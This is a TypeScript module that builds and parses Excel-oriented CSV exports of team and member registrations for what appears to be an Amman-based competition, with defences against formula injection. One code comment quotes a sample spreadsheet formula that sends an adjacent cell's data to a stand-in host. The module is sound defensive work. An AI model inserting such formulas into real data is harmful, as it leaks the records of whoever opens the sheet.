/**
 * CSV serialisation, aimed squarely at Excel.
 *
 * Free of Prisma and of the request, so the two things that are easy to get
 * quietly wrong — a field that breaks out of its column, and a field that
 * executes when the spreadsheet opens — are tested directly rather than by
 * downloading a file and looking at it.
 */

/** RFC 4180 wants CRLF, and Excel is the least forgiving reader of the two. */
const ROW_SEPARATOR = "\r\n";

/** Written as an escape rather than the character itself, which is invisible. */
export const BOM = "\uFEFF";

/**
 * Leading characters that make Excel treat a cell as a formula rather than as
 * text.
 *
 * This matters here more than in most exports: team names, member names and
 * university names are typed by the public, so a registrant can choose exactly
 * what lands in this file. Left alone, a team called
 * `=HYPERLINK("http://x/?"&A1)` exfiltrates the row next to it the moment an
 * admin opens the sheet, and the DDE variants can do considerably worse.
 *
 * Tab and carriage return are included because Excel strips them and then
 * reads whatever is underneath.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Makes one value safe to put in a cell.
 *
 * A leading apostrophe is Excel's own "this is text" marker: it is not shown
 * in the cell, it survives a re-save, and it is what stops the formula parser
 * from ever seeing the value. It does mean a `+962…` phone number is stored
 * with one — which is the behaviour you want anyway, since Excel would
 * otherwise render that cell as #NAME?.
 */
export function sanitiseCell(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_TRIGGERS.some((trigger) => value.startsWith(trigger)) ? `'${value}` : value;
}

/**
 * Quotes one field if it needs it.
 *
 * Quoting is what keeps a comma inside a value from becoming a new column, and
 * doubling the quotes is what keeps a quote inside a value from ending the
 * field early. Leading and trailing spaces are quoted too, since some readers
 * silently trim an unquoted field and the data then differs from what was
 * entered.
 */
export function escapeCsvField(value: unknown): string {
  const raw = valueToString(value);
  const safe = sanitiseCell(raw);
  const needsQuotes = /[",\r\n]/.test(safe) || safe !== safe.trim();
  return needsQuotes ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/**
 * How each kind of value reads in a cell.
 *
 * Dates go out as ISO 8601 with a space instead of the "T", which Excel parses
 * as a real date on import while remaining readable if anyone opens the file
 * in a text editor. Null and undefined become empty rather than the strings
 * "null" and "undefined", which is the difference between an empty cell and a
 * cell someone has to clean up.
 */
function valueToString(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (value instanceof Date) {
    return Number.isNaN(value.getTime()) ? "" : value.toISOString().replace("T", " ").slice(0, 19);
  }
  if (typeof value === "boolean") return value ? "yes" : "no";
  return String(value);
}

/**
 * A whole sheet: one header row, then the data.
 *
 * The byte-order mark is not decoration. Without it Excel opens a UTF-8 file
 * as the local code page, and every Arabic name in it arrives as mojibake —
 * which, on a competition run out of Amman, is most of the interesting rows.
 */
export function toCsv(headers: readonly string[], rows: readonly unknown[][]): string {
  const lines = [headers.map(escapeCsvField).join(",")];
  for (const row of rows) {
    lines.push(row.map(escapeCsvField).join(","));
  }
  return `${BOM}${lines.join(ROW_SEPARATOR)}${ROW_SEPARATOR}`;
}

/** Fils to a plain decimal, so the cell is a number Excel can total. */
export function filsToAmount(fils: number | null | undefined): number | null {
  return fils === null || fils === undefined ? null : fils / 1000;
}

export interface TeamRowSource {
  teamName: string;
  submitterEmail: string;
  status: string;
  memberCount: number;
  feeTier: string;
  feeBaseFils: number | null;
  feeDiscountFils: number | null;
  feeDueFils: number | null;
  paymentStatus: string;
  paymentAmountFils: number | null;
  paymentReference: string | null;
  paymentSubmittedAt: Date | null;
  paymentVerifiedAt: Date | null;
  paymentNote: string | null;
  paymentScreenshotUrl: string | null;
  consentVersion: string | null;
  consentAcceptedAt: Date | null;
  createdAt: Date;
  referralCode?: string;
}

/**
 * How many member blocks the teams sheet carries.
 *
 * Must equal MAX_TEAM_SIZE in registration.ts, which is not imported here
 * because that module pulls in Prisma and the mail client, and this one is
 * deliberately free of both. A test asserts the two agree, so raising the team
 * size cannot silently start truncating the export.
 *
 * Fixed rather than sized to the largest team present: a column count that
 * changes with the data would rearrange the sheet under an Excel query that is
 * already bound to it, which is how a refresh quietly starts filling the wrong
 * columns.
 */
export const TEAM_MEMBER_SLOTS = 3;

/** What each member contributes to a team row, in order. */
const MEMBER_FIELDS = [
  "first name",
  "last name",
  "email",
  "WhatsApp",
  "university",
  "IEEE status",
  "IEEE membership ID",
  "major",
] as const;

/**
 * Team identity first, then the people, then the money.
 *
 * The members sit in the middle rather than at the end because that is the
 * reading order of the row: who they are, then what they owe. Every slot is
 * present whether or not the team filled it, so column N is the same field on
 * every row — the property any formula or pivot over this sheet depends on.
 */
export const TEAM_HEADERS: readonly string[] = [
  "Team name",
  "Submitter email",
  "Status",
  "Members",
  ...Array.from({ length: TEAM_MEMBER_SLOTS }, (_, slot) =>
    MEMBER_FIELDS.map((field) => `Member ${slot + 1} ${field}`),
  ).flat(),
  "Fee tier",
  "Quoted (JOD)",
  "Discount (JOD)",
  "Base price (JOD)",
  "Payment status",
  "Reported amount (JOD)",
  "Payment reference",
  "Payment submitted",
  "Payment verified",
  "Payment note",
  "Screenshot uploaded",
  "Consent version",
  "Consent accepted",
  "Registered at",
  // Last, so adding it moved no column an existing sheet query is bound to.
  "Referral code",
];

/**
 * The cells for one member slot, or a run of empty cells if the team has no
 * one in it.
 *
 * Empty rather than omitted: a two-person team must still occupy the same
 * columns as a three-person one, or the fee columns shift left on some rows and
 * the sheet becomes unreadable the moment anyone sorts it.
 */
function memberCells(member: MemberRowSource | undefined): unknown[] {
  return [
    member?.firstName ?? null,
    member?.lastName ?? null,
    member?.email ?? null,
    member?.whatsapp ?? null,
    member?.university ?? null,
    member?.ieeeStatus ?? null,
    member?.ieeeMembershipId ?? null,
    member?.major ?? null,
  ];
}

/**
 * One row per team, carrying the whole team.
 *
 * The resume code is deliberately absent. It is a credential — anyone holding
 * it can reopen that team's registration and change what was submitted — and a
 * spreadsheet that gets mailed around is the last place it should be. The
 * screenshot is reported as a yes/no for the same reason: its URL is the one
 * thing the admin screenshot route exists to keep out of circulation.
 *
 * Members are sorted here rather than trusted to arrive in order, so "member 1"
 * means the same person as the team saw on the form no matter how they were
 * fetched. Anyone beyond the last slot is dropped — which cannot happen while
 * TEAM_MEMBER_SLOTS tracks MAX_TEAM_SIZE, and is why a test holds those
 * together.
 */
export function teamRow(
  registration: TeamRowSource,
  members: readonly MemberRowSource[] = [],
): unknown[] {
  const ordered = [...members].sort((a, b) => a.order - b.order);

  return [
    registration.teamName,
    registration.submitterEmail,
    registration.status,
    registration.memberCount,
    ...Array.from({ length: TEAM_MEMBER_SLOTS }, (_, slot) => memberCells(ordered[slot])).flat(),
    registration.feeTier,
    filsToAmount(registration.feeDueFils),
    filsToAmount(registration.feeDiscountFils),
    filsToAmount(registration.feeBaseFils),
    registration.paymentStatus,
    filsToAmount(registration.paymentAmountFils),
    registration.paymentReference,
    registration.paymentSubmittedAt,
    registration.paymentVerifiedAt,
    registration.paymentNote,
    Boolean(registration.paymentScreenshotUrl),
    registration.consentVersion,
    registration.consentAcceptedAt,
    registration.createdAt,
    registration.referralCode || null,
  ];
}

export interface MemberRowSource {
  order: number;
  firstName: string;
  lastName: string;
  email: string;
  whatsapp: string;
  university: string;
  major: string;
  ieeeStatus: string;
  ieeeMembershipId: string;
}

export const MEMBER_HEADERS = [
  "Team name",
  "Team status",
  "Member #",
  "First name",
  "Last name",
  "Email",
  "WhatsApp",
  "University",
  "Major",
  "IEEE status",
  "IEEE membership ID",
] as const;

/**
 * One row per person, carrying the team name and status so the sheet stands on
 * its own.
 *
 * Repeating those two columns rather than making the reader join against the
 * teams sheet: the common use of this file is filtering people by whether
 * their team is confirmed, and a VLOOKUP is not a reasonable thing to ask of
 * someone chasing missing WhatsApp numbers the week before the event.
 */
export function memberRow(
  teamName: string,
  teamStatus: string,
  member: MemberRowSource,
): unknown[] {
  return [
    teamName,
    teamStatus,
    // Already 1-based in the database (see registration.ts, `order: i + 1`),
    // so this is the number the team themselves saw on the form.
    member.order,
    member.firstName,
    member.lastName,
    member.email,
    member.whatsapp,
    member.university,
    member.major,
    member.ieeeStatus,
    member.ieeeMembershipId,
  ];
}

/**
 * Reads a CSV file back: what an admin saved from Excel, Google Sheets or
 * Numbers, or one of this site's own exports.
 *
 * Quoted fields, doubled quotes and line breaks inside quotes all read as
 * RFC 4180 says. The separator is taken from the header line, since Excel in
 * much of the world saves with semicolons, and a tab-separated paste works the
 * same way. The apostrophe sanitiseCell puts in front of a formula-looking
 * value comes off again, so an export read back is what went out. Blank lines
 * are dropped.
 */
export function parseCsv(text: string): string[][] {
  const source = text.startsWith(BOM) ? text.slice(1) : text;
  const delimiter = detectDelimiter(source);
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  const endField = () => {
    row.push(field.length > 1 && field[0] === "'" && FORMULA_TRIGGERS.includes(field[1]!) ? field.slice(1) : field);
    field = "";
  };
  const endRow = () => {
    endField();
    if (row.some((cell) => cell.trim() !== "")) rows.push(row);
    row = [];
  };
  for (let i = 0; i < source.length; i++) {
    const char = source[i]!;
    if (quoted) {
      if (char === '"') {
        if (source[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          quoted = false;
        }
      } else {
        field += char;
      }
    } else if (char === '"' && field === "") {
      quoted = true;
    } else if (char === delimiter) {
      endField();
    } else if (char === "\n" || char === "\r") {
      if (char === "\r" && source[i + 1] === "\n") i++;
      endRow();
    } else {
      field += char;
    }
  }
  if (field !== "" || row.length) endRow();
  return rows;
}

/** Whichever of comma, semicolon and tab the first line uses most, outside quotes. */
function detectDelimiter(text: string): string {
  const counts = new Map<string, number>([
    [",", 0],
    [";", 0],
    ["\t", 0],
  ]);
  let quoted = false;
  for (const char of text) {
    if (char === '"') quoted = !quoted;
    else if (!quoted && (char === "\n" || char === "\r")) break;
    else if (!quoted && counts.has(char)) counts.set(char, counts.get(char)! + 1);
  }
  let best = ",";
  for (const [char, count] of counts) if (count > counts.get(best)!) best = char;
  return best;
}
